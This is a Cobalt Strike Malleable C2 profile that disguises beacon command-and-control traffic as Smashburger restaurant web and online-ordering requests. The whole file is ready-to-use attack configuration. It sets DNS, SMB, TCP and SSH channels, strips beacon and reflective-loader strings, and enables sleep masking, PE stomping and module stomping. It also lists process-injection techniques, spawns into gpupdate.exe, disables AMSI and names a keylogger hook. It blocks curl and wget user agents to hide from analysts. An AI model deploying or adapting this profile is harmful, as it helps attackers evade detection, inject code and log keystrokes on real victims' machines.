#trevorforget
#xx0hcd

set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)";
set data_jitter "50";

dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

###SMB options###
set pipename "ntsvcs##";
set pipename_stager "scerpc##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH options###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

#custom cert
#https-certificate {
#    set keystore "your_store_file.store";
#    set password "your_store_pass";
#}

http-config {
#    set headers "Server, Content-Type, Cache-Control, Connection";
#    header "Connection" "close";
#    header "Cache-Control" "max-age=2";
#    header "Server" "nginx";
    #set "true" if teamserver is behind redirector
    set trust_x_forwarded_for "false";
    
    set block_useragents "curl*,lynx*,wget*";
}

#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

http-get {
    
    set uri "/us/ky/louisville/312-s-fourth-st.html";
    
    client {

#	header "Host" "locations.smashburger.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US,en;q=0.5";
	header "Referer" "https://locations.smashburger.com/us/ky/louisville.html";
	header "Connection" "close";
	
        
        metadata {
            base64url;
	    header "Cookie";

        }

    }

    server {

	header "Content-Type" "text/html; charset=utf-8";
	header "Etag" "\"57507b788e9ddc737aae615d6bcfc875\"";
	header "Server" "AmazonS3";
	header "Last-Modified" "on, 23 Oct 2017 20:50:49 GMT";
	header "Vary" "Accept-Encoding";
	header "X-Amz-Id-2" "1bGgvQSuG7u4T5qWKlikvJ//uxb9tKkDsbSDOV8YBxhKk64Ij3ygUMxZQ=";
	header "X-Amz-Request-Id" "AC1346376B07D";
	header "Connection" "close";
        

        output {

            base64url;

	    prepend "<!doctype html><html lang=\"en\" dir=\"ltr\" class=\"victoria\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"><link rel=\"dns-prefetch\" href=\"//www.yext-pixel.com\"><link rel=\"dns-prefetch\" href=\"//a.cdnmktg.com\"><link rel=\"dns-prefetch\" href=\"//a.mktgcdn.com\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"><meta name=\"format-detection\" content=\"telephone=no\"><link rel=\"shortcut icon\" href=\"../../../images/locations.smashburger.com/favicon.png\"><meta name=\"description\" content=\"Come in to Smashburger at 312 S Fourth St in Louisville, KY and visit our family-friendly restaurant for burgers, salads, chicken sandwiches, hand-spun shakes & kids meals.\"><meta name=\"keywords\" content=\"\"><meta property=\"og:title\" content=\"Smashburger in 312 S Fourth St Louisville, KY | burgers, sandwiches, shakes\"><meta property=\"og:description\" content=\"Come in to Smashburger at 312 S Fourth St in Louisville, KY and visit our family-friendly restaurant for burgers, salads, chicken sandwiches, hand-spun shakes & kids meals.\"><meta property=\"og:image\" content=\"../../../images/locations.smashburger.com/logo.png\"><meta property=\"og:type\" content=\"website\"><meta property=\"og:url\" content=\"../../../us/ky/louisville/312-s-fourth-st.html\"><link rel=\"canonical\" href=\"https://locations.smashburger.com/us/ky/louisville/312-s-fourth-st.html\" /><title>Smashburger in 312 S Fourth St Louisville, KY | burgers, sandwiches, shakes</title><script type=\"text/javascript\">ref=";

	    append "../../../us.html\"><span class=\"c-bread-crumbs-name\">US</span></a></li><li class=\"c-bread-crumbs-item\"><a href=\"../../../us/ky.html\"><span class=\"c-bread-crumbs-name\">KY</span></a></li><li class=\"c-bread-crumbs-item\"><a href=\"../../../us/ky/louisville.html\"><span class=\"c-bread-crumbs-name\">Louisville</span></a></li><li class=\"c-bread-crumbs-item\"><span class=\"c-bread-crumbs-name\">312 S Fourth St</span></li></ol></nav></div><div class=\"l-container\"><ul class=\"c-social-links\"><li class=\"c-social-links-item\"><a href=\"https://twitter.com/smashburger\" class=\"c-social-link c-social-link-twitter\"><span class=\"sr-only\">Visit us on Twitter</span><svg class=\"icon icon-twitter icon-social\" aria-hidden=\"true\"><use xlink:href=\"../../../images/icons.svg#twitter\" /></svg></a></li><li class=\"c-social-links-item\"><a href=\"https://www.facebook.com/smashburger\" class=\"c-social-link c-social-link-facebook\"><span class=\"sr-only\">Visit us on Facebook</span><svg class=\"icon icon-facebook icon-social\" aria-hidden=\"true\"><use xlink:href=\"../../../images/icons.svg#facebook\" /></svg></a></li><li class=\"c-social-links-item\"><a href=\"https://www.instagram.com/smashburger/\" class=\"c-social-link c-social-link-instagram\"><span class=\"sr-only\">Visit us on Instagram</span><svg class=\"icon icon-instagram icon-social\" aria-hidden=\"true\"><use xlink:href=\"../../../images/icons.svg#instagram\" /></svg></a></li></ul><p class=\"c-copy-date \">&copy;<span id=\"js-copy-date\">2017</span> Smashburger Master LLC.  All rights reserved.<script>(function(){var year = new Date().getFullYear(); document.getElementById('js-copy-date').innerText = year;})()</script>";
	

            print;
        }
    }
}

http-post {
    
    set uri "/OrderEntryService.asmx/AddOrderLine";

    client {

#	header "Host" "smashburger.alohaorderonline.com";
	header "Accept" "*/*";    
	header "Accept-Language" "en-US,en;q=0.5";
	header "X-Requested-With" "XMLHttpRequest";
        
        output {
            base64url;
	    print;
	    


        }


        id {
            base64url;
	    header "Cookie";

        }

    }

    server {

	header "Cache-Control" "private, max-age=0";
	header "Content-Type" "application/json; charset=utf-8";
	header "Vary" "Accept-Encoding";
	header "Server" "Microsoft-IIS/7.5";
	header "X-AspNet-Version" "4.0.30319";
	header "X-Powered-By" "ASP.NET";
	header "X-UA-Compatible" "IE=Edge";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Connection" "close";
        
        
        output {
            netbios;
	    
	    prepend "{\"d\":{\"__type\":\"Radiant.Order.Web.Order.CodeFiles.OrderEntryResults.OrderEntryResult\",\"Success\":true,\"Message\":\"\",\"ResultCode\":0,\"Order\":{\"__type\":\"Radiant.Order.Shared.Contracts.ServiceEntities.Order\",\"SiteId\":190,\"OrderId\":20106,\"SubTotalAmount\":3.9900,\"TaxAmount\":0,\"TotalAmount\":3.9900,\"BalanceDueAmount\":3.9900,\"Status\":1,\"NextItemLineNumber\":2,\"SpecialInstructions\":null,\"LineItems\":[{\"ItemLineNumber\":1,\"SalesItemId\":41099,\"Name\":\"Strawberry Shake\",\"Quantity\":1,\"UnitPrice\":3.9900,\"ExtendedPrice\":3.9900,\"NextModifierSequenceNumber\":1,\"SpecialInstructions=";

	    append "&OrderingForCustomerId\":null,\"CheckoutCount\":0,\"VehicleMake\":null,\"VehicleModel\":null,\"VehicleColor\":null,\"OrderType\":1,\"OrderSource\":0,\"Destination\":0,\"ShouldManualRelease\":false,\"SVCAmount\":0,\"TipAmount\":0,\"LoyaltyCardNumber\":null,\"Recipients\":[],\"DeliveryFeeSetFromDeliveryZone\":false,\"PromoId\":0,\"DeliveryFeeTaxApplied\":false,\"PosStatus\":18,\"PosOrderId\":null,\"ReferenceNumber\":null,\"CalculateTaxAndTotalTime\":0,\"ClientSessionID\":\"jdyfu2yh5eqsbhs343phqlct\",\"AddOrderTime\":0,\"ComboItems\":[],\"OrderDiscounts\":[],\"WebSalesGroupLineIds\":[],\"WebSalesGroupLineItemNumbers\":[],\"RecomputedSubTotal\":3.9900,\"CanUpdateOrder\":0,\"Metadata\":{\"ClientPlatform\":null,\"ClientVersion\":null},\"AssignLoyalty\":true,\"Payments\":[],\"NextOrderOfProcessing\":1,\"SiteNotes\":null,\"DiscountTotal\":0,\"ExternalOrderId\":null,\"Comps\":null,\"AppliedComps\":null,\"LoyaltyRewards\":[],\"HasDiscount\":false,\"GetDiscount\":0},\"SessionExpired\":false,\"ItemNotFound\":false,\"ItemNotFoundMessage\":null}}";

            print;
        }
    }
}

http-stager {

    set uri_x86 "/menus.aspx";
    set uri_x64 "/Menus.aspx";


    client {

#	header "Host" "smashburger.alohaorderonline.com";
        header "Accept" "*/*";
	header "Accept-Language" "en-US,en;q=0.5";
	header "Referer" "https://locations.smashburger.com/us/ky/louisville/312-s-fourth-st.html";
	header "Connection" "close";

    }

    server {
        header "Cache-Control" "private";
	header "Content-Type" "text/html; charset=utf-8";
	header "Location" "/Time.aspx";
	header "Server" "Microsoft-IIS/7.5";
	header "X-AspNet-Version" "4.0.30319";
	header "Set-Cookie" "OrderMode=1; path=/";
	header "X-Powered-By" "ASP.NET";
	header "X-UA-Compatible" "IE=Edge";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Connection" "close";

	output {
	    print;
	}
    
    }


}

###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "17 Oct 2020 04:32:14";
    set entry_point     "170001";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	        "WWanMM.dll";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "";
    
    set sleep_mask "true";
    
    set smartinject "true";
    
    #allocator options include HeapAlloc, MapViewOfFile, VirtualAlloc, or you can use module stomp.
    #set allocator "HeapAlloc";
    set magic_mz_x86 "MZRE";
    set magic_mz_x64 "MZAR";
    set magic_pe "EA";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    #string "something";
    #data "something";
    #stringw "something"; 
}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        #prepend "\x90\x90\x90";
    }
    transform-x64 {
        #prepend "\x90\x90\x90";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";
    
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
    set keylogger "SetWindowsHookEx";


}
